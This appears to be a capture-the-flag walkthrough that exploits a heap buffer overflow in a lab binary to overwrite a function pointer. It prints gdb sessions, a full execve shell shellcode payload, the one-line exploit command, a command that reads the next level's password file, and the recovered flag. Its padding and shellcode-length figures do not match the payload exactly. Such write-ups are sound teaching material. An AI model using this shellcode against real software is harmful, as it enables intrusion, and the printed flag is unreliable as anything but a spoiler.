# Level 09 Walkthrough

## Binary analysis

The binary uses function pointers and user-controlled data, making it vulnerable to a buffer overflow. By overflowing a buffer, we can inject shellcode and overwrite a function pointer to execute arbitrary code.

### Key decompiled code

The program allocates memory and uses user input to set up function pointers and buffers. Eventually, it calls a function pointer that can be overwritten via a buffer overflow.
Example vulnerable code:
```c
char buffer[...];
// ...
strcpy(buffer, user_input); // vulnerable
// ...
call function_pointer; // can be overwritten
```

When given a big input, we can see a segfaults happening here:
```
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) p/x $eip
$1 = 0x8048682
(gdb) disass
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
=> 0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
```

On those lines, eax is dereferenced twice and moved to edx, which is later called as a function pointer.
In C-like terms: `eax = *p; edx = **p; ((func_t)edx)(arg1, arg2);`

## Exploitation

Let's get the address of our buffer, we know it's the return value of setAnnotation call.

```
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) r ABCDEFGHIJKLMNOPQRSTUVWXYZ
Starting program: /home/user/level9/level9 ABCDEFGHIJKLMNOPQRSTUVWXYZ

Breakpoint 1, 0x0804867c in main ()
(gdb) x/s $eax
0x804a00c:	 "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
```

We find the offset to be 108 bytes thanks to the cyclic pattern.
```
(gdb) b *0x08048680
Breakpoint 1 at 0x8048680
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A

Breakpoint 1, 0x08048680 in main ()
(gdb) x/s $eax
0x804a078:	 "Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A"
```

We craft a payload so that there is one address to jump to in the buffer then to jump to the shellcode.
```
0x804a00c + 4 = 0x804a010
```

The padding is 108 - 4 (the address to jump to the shellcode) - 29 (length of the shellcode) = 75
```
payload = b"\x08\x04\xa0\x10"[::-1] + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + b"A"*76 + b"\x08\x04\xa0\x0c"[::-1]
```

## Commands used

```
./level9 $(python -c 'print(b"\x08\x04\xa0\x10"[::-1] + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + b"A"*76 + b"\x08\x04\xa0\x0c"[::-1])')
cat /home/user/bonus0/.pass
```

## Result

After running the exploit, we get the password for bonus0:

```
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```